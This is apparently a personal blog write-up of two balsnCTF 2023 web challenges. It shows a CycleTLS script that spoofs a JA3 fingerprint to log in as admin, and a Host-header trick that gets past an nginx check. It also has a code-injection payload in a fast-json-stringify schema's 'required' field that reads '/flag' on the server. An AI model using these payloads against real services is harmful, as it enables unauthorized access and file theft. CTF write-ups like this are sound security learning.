---
title: "balsnCTF23"
date: 2023-10-12T19:46:31+02:00
tags: ["web","ja3","serialization"]
categories: ["ctf"]
author: "Ayman Boulaich"
showToc: false
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "I have had the pleasure of participating on balsnCTF. This CTF was so funny and I have been able to learn a lot. In this writeup I am gonna write about 0FA and SaaS."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## INDEX

- [0FA](https://pwndside.github.io/posts/balsnctf23/#0FA)
- [SaaS](https://pwndside.github.io/posts/balsnctf23/#SaaS)

## 0FA

![Untitled](/CTF/balsnctf23-1.png)

This challenge was so fun as easy. The main part of this level is the JA3 spoof.

```php
function fingerprint_check() {
    if($_SERVER['HTTP_SSL_JA3'] !== FINGERPRINT) 
        die("Login Failed!"); 
}
```

Taking a look to the source code we can see that after we submit a username `fingerprint_check()` close our connection if we don’t have a specific JA3

JA3 is **a method to fingerprint a SSL/TLS client connection based on fields in the Client Hello message from the SSL/TLS handshake**.

So basically, we need to impersonate a JA3 fingerprint.

There is no way to do it via headers on a burp request but hopefully a JavaScript library named CycleTLS helps to send a request with a custom JA3.

I built the next script in typescript in order to log as admin and get the flag.

```tsx
const initCycleTLS = require('cycletls');
// Typescript: import initCycleTLS from 'cycletls';

(async () => {
    // Initiate CycleTLS
    const cycleTLS = await initCycleTLS()

    // Send request
    const response = await cycleTLS(
        'https://localhost:8787/flag.php',
        {
            body: 'username=admin',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            ja3: '771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0',
            userAgent: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'
        },
        'post'
    )

    console.log(response)

    // Cleanly exit CycleTLS
    cycleTLS.exit()
})()
```

> BALSN{Ez3z_Ja3__W4rmUp}
> 

## SaaS

![Untitled](/CTF/balsnctf23-2.png)

This challenge focuses on serialization which is present as a clue on the challenge name **Serialization as a Service.**

```jsx
const validatorFactory = require('@fastify/fast-json-stringify-compiler').SerializerSelector()()
const fastify = require('fastify')({
  logger: true,
})
const {v4: uuid} = require('uuid')
const FLAG = 'the old one'
const customValidators = Object.create(null, {}) // no more p.p.
const defaultSchema = {
  type: 'object',
  properties: {
    pong: {
      type: 'string',
    },
  },
}
fastify.get(
  '/',
  {
    schema: {
      response: {
        200: defaultSchema,
      },
    },
  },
  async () => {
    return {pong: 'hi'}
  }
)
fastify.get('/whowilldothis/:uid', async (req, resp) => {
  const {uid} = req.params
  const validator = customValidators[uid]
  if (validator) {
    return validator({[FLAG]: 'congratulations'})
  } else {
    return {msg: 'not found'}
  }
})

fastify.post('/register', {}, async (req, resp) => {
  // can only access from internal.
  const nid = uuid()
  const schema = Object.assign({}, defaultSchema, req.body)
  customValidators[nid] = validatorFactory({schema})
  return {route: `/whowilldothis/${nid}`}
})
fastify.listen({port: 3000, host: '0.0.0.0'}, function (err, address) {
  if (err) {
    fastify.log.error(err)
    process.exit(1)
  }
  // Server is now listening on ${address}
})
```

```docker
server {
    listen 80 default_server;
    return 404;
}
server {
    server_name *.saas;
    if ($http_host != "easy++++++") { return 403 ;}
    location ~ {
      proxy_pass http://backend:3000;
    }
}
```

The first thing we need to do is to bypass the nginx check in order to be able to see the site hosted on port 3000.

**server_name** has to be set to `*.saas` and **http.host** to `easy++++++` we can do that by changing it via BurpSuite.

```html
GET http://any.saas/ HTTP/1.1
Host: easy++++++
```

The code uses the **fastify** framework and the **fast-json-stringify** library to serialize schemas dynamically.

The next security [notice](https://fastify.dev/docs/latest/Reference/Validation-and-Serialization/#--security-notice) of the fastify doc gives us an approach of where is the main problem of this challenge.

Basically if a dev doesn’t treat the schema definition as a code and let the users create schemas with untrusted output may lead to undefined behavior.

If we check the source we have a endpoint called register which creates a schema merging the default one and the request body and creates a custom validator with that schema.

`/whowilldothis/:uid` endpoint with the corresponding uid, we can see how works his validator.

Googling I found a HackerOne which talks about a RCE vuln on the **fast-json-stringify** library. This reports helps me to find a RCE on this piece of code:

```jsx
// handle extraneous required fields
  for (const requiredProperty of required) {
    if (requiredWithDefault.indexOf(requiredProperty) !== -1) continue
    code += `if (obj['${requiredProperty}'] === undefined) throw new Error('"${requiredProperty}" is required!')\n`
  }
```

If we have a validator with a required property and if we are validating a schema without that property an error would be trigged.

As the `/whowilldothis/:uid` doesn’t validate a schema with the required property we can put this property via register endpoint and put a payload on it.

```html
POST http://.saas/register HTTP/1.1
Host: easy++++++
Content-Type: application/json
Content-Length: 101

{
  "required": ["'+global.process.mainModule.constructor._load('fs').readFileSync('/flag')+'"]
}

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Thu, 12 Oct 2023 17:01:15 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 63
Connection: close

{"route":"/whowilldothis/1b00e70e-cea0-4003-9179-752e3179414e"}
```

![Untitled](/CTF/balsnctf23-3.png)

![Untitled](/CTF/balsnctf23-4.png)

> BALSN{N0t_R3ally_aN_u3s_Ca53}
>

**Thank you for reading, and happy hacking! 😄**